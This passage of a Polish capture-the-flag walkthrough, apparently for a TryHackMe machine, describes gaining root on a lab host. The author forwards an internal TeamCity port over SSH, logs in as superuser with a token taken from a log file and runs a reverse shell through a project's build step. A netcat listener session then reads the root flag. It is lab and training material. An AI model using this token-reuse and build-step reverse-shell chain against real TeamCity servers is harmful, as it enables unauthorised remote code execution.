6. Za pomocą przekierowania ```ssh``` poleceniem ```ssh -i id_rsa -L 4444:localhost:8111 sys-internal@<IP_atakowanej_maszyny>``` przekierowałem pracę "lokalnego hosta" atakowanej maszyny na stój lokalny host.

![Oops!…I_Did_It_Again](/screens/v_przekierowanie_ssh.png)

Następnie w przeglądarce ppisuję ```http://127.0.0.1:4444/``` i pojawia się możliwość logowania. Zauwarzam możliwość logowania za pomocą użytkownika ```superuser```, tam wykorzystuję znaleziony wcześniej ```token``` w pliku ```catalina.out``` w katalogu ```/TeamCity/log```.

Następnie tworze nowy projetk. Po stworzeniu go szukam możliwości wykonania kodu, rozgladając się po ```stettings```, zamykając projekt i potwierając go z zakładki górnrj ```Projects``` znajduję poszukiwaną możliwość w zakładce bocznej ```Build Steps```. Dzieki narzędziu [revshells.com](https://www.revshells.com/) stworzyłem kod zwracający mi odwróconą powłokę z możliwością wejścia do katalogu ```root``` tam znajduje się flaga ```root.txt```.

![Loading...](/screens/v_okno_do_logowania_TC.png)
![cierpliwosci](/screens/v_TC_po_zalogowaniu.png)
![](/screens/v_reverseshell.png)
![](/screens/v_wykonanie_reverseshell.png)

```
┌──(kali㉿kali)-[~]
└─$ nc -lvp 8080             
listening on [any] 8080 ...
10.10.173.242: inverse host lookup failed: Unknown host
connect to [10.8.78.81] from (UNKNOWN) [10.10.173.242] 44018
# whoami
whoami
root
# cd /root/     
cd /root/
# ls
ls
root.txt
# cat root.txt
cat root.txt
THM{e8996faea46df09dba5676dd271c60bd}
#  
```

![FINISH_HIM](/screens/v_final.png)

## [Raport:](/Podsumowanie%20wykonanych%20prac.doc)

